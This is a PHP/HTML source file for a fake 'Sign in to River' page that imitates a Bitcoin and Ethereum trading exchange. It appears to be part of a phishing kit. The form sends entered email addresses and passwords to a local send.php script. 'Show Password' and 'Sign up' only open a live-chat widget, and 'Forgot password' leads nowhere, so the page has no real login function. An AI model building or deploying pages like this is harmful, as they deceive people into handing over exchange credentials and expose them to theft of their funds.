<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    unset($_SESSION['email']);
    unset($_SESSION['password']);
    unset($_SESSION['phone_number']);
    $title = 'Sign in to River| Buy, Sell and Margin Trade Bitcoin (BTC) and Ethereum (ETH)';
    include_once './includes/meta.php';
    ?>
    <body>
        <div class="container">
            <?php include_once './includes/header.php'; ?>
            <div class="row mt-3">
                <div class="col-12 offset-0 col-md-6 offset-md-3">
                    <div class="p-5">
                        <form method="post" action="<?= base_url('send.php') ?>" class="col-12 shadow-sm px20 py17 rounded-4">
                            <h2 class="fs30 mb25 text-center text-white">Sign in to River</h2>
                            <div class="mt-4 mb-4">
                                <label for="" class="form-label fw-normal text-white">Email Address</label>
                                <input name="email" type="text" maxlength="100" required="" placeholder="Enter Email Address " class="form-control form-control-lg border border-secondary bg-dark"  value="" >
                            </div>
                            <div class="mt15">
                                <label for="" class="form-label fw-normal text-white">Password </label>
                                <a href="javascript:void(Tawk_API.toggle())" class="text-decoration-none float-end text-gold ms50">Show Password</a>
                                <input name="password" type="password" required="" minlength="3" maxlength="50"  class="form-control form-control-lg bg-dark border border-secondary" placeholder="Enter Password" value="" >
                            </div>
                            <div class="mt-1 mb30">
                                <a href="#" class=" text-decoration-none text-gold fs13">
                                    Forgot password?
                                </a>
                            </div>
                            <div class="text-center mx-auto mt-3 d-grid gap-2">
                                <button type="submit" class="btn bg-gold btn-lg btn-primary-3 border-0 fs16 fw-medium btn-block rounded-2">Continue</button>
                            </div>
                            <div class="text-center my25 mt-1 fs-14">
                                <span class="text-secondary">Don't have a River account? </span>
                                <a href="javascript:void(Tawk_API.toggle())" class="text-decoration-none text-gold">Sign up here</a>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <?php include_once './includes/footer.php'; ?>
        </div>
    </body>
</html>